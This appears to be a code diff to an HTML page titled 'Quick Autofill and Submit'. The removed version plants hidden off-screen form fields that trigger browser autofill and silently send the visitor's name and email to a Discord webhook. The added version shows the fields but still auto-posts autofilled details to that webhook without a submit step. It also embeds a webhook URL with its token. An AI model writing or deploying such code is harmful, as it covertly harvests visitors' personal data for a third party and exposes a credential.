@@ -3,59 +3,53 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Auto-Fill on Click</title>
+  <title>Quick Autofill and Submit</title>
 </head>
 <body>
-  <h1>Click the text below to submit your info</h1>
-  <p id="triggerText" style="cursor:pointer; color:blue; text-decoration:underline;">
-    Click here
+  <h1>Get User Info</h1>
+  <p id="trigger" style="cursor:pointer; color:blue; text-decoration:underline;">
+    Click here to reveal and fill the form
   </p>
 
+  <div id="formContainer" style="display:none;">
+    <p>Please click inside each field to allow your browser to autofill your details.</p>
+    <form id="userForm" autocomplete="on">
+      <label for="fname">First Name:</label>
+      <input type="text" id="fname" name="given-name" autocomplete="given-name" required><br><br>
+
+      <label for="lname">Last Name:</label>
+      <input type="text" id="lname" name="family-name" autocomplete="family-name" required><br><br>
+
+      <label for="email">Email:</label>
+      <input type="email" id="email" name="email" autocomplete="email" required><br><br>
+    </form>
+  </div>
+
   <script>
-    // Replace with your actual Discord webhook URL
+    // Discord webhook from the request
     const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1316507623830458530/AJs1HDBblw6pbV0MldGNLKA3pusxfwjPjFg1qKZ7qO3UcCLtkbTv5SIHvXTVS1FK9z58';
 
-    const triggerText = document.getElementById('triggerText');
+    const trigger = document.getElementById('trigger');
+    const formContainer = document.getElementById('formContainer');
+    const fnameField = document.getElementById('fname');
+    const lnameField = document.getElementById('lname');
+    const emailField = document.getElementById('email');
 
-    // Function to create and insert the form
-    function createAndSubmitForm() {
-      const form = document.createElement('form');
-      form.id = 'userForm';
-      form.autocomplete = 'on';
-
-      form.innerHTML = `
-        <input type="text" id="fname" name="given-name" autocomplete="given-name" required style="opacity:0; position:absolute; top:-9999px;">
-        <input type="text" id="lname" name="family-name" autocomplete="family-name" required style="opacity:0; position:absolute; top:-9999px;">
-        <input type="email" id="email" name="email" autocomplete="email" required style="opacity:0; position:absolute; top:-9999px;">
-      `;
-
-      document.body.appendChild(form);
-
-      const fnameField = document.getElementById('fname');
-      const lnameField = document.getElementById('lname');
-      const emailField = document.getElementById('email');
-
-      function checkFields() {
-        if (fnameField.value.trim() !== '' && lnameField.value.trim() !== '' && emailField.value.trim() !== '') {
-          submitForm(fnameField.value.trim(), lnameField.value.trim(), emailField.value.trim());
-        }
-      }
-
-      // Focus the first field to prompt autofill
+    // Show the form when the user clicks the trigger text
+    trigger.addEventListener('click', () => {
+      formContainer.style.display = 'block';
+      // Optionally focus the first field to encourage autofill
       fnameField.focus();
+    });
 
-      fnameField.addEventListener('input', checkFields);
-      lnameField.addEventListener('input', checkFields);
-      emailField.addEventListener('input', checkFields);
-
-      fnameField.addEventListener('change', checkFields);
-      lnameField.addEventListener('change', checkFields);
-      emailField.addEventListener('change', checkFields);
+    function checkFields() {
+      if (fnameField.value.trim() !== '' && lnameField.value.trim() !== '' && emailField.value.trim() !== '') {
+        submitForm(fnameField.value.trim(), lnameField.value.trim(), emailField.value.trim());
+      }
     }
 
     function submitForm(fname, lname, email) {
-      const message = `Auto-submitted info:\n**First Name:** ${fname}\n**Last Name:** ${lname}\n**Email:** ${email}`;
-
+      const message = `**Autofilled Submission:**\n**First Name:** ${fname}\n**Last Name:** ${lname}\n**Email:** ${email}`;
       fetch(DISCORD_WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -71,10 +65,14 @@
       .catch(err => console.error('Error sending message to Discord:', err));
     }
 
-    // When the user clicks the text, create the form and attempt to autofill/submit it
-    triggerText.addEventListener('click', () => {
-      createAndSubmitForm();
-    });
+    // Listen to input and change events to detect when autofill has occurred
+    fnameField.addEventListener('input', checkFields);
+    lnameField.addEventListener('input', checkFields);
+    emailField.addEventListener('input', checkFields);
+
+    fnameField.addEventListener('change', checkFields);
+    lnameField.addEventListener('change', checkFields);
+    emailField.addEventListener('change', checkFields);
   </script>
 </body>
 </html>
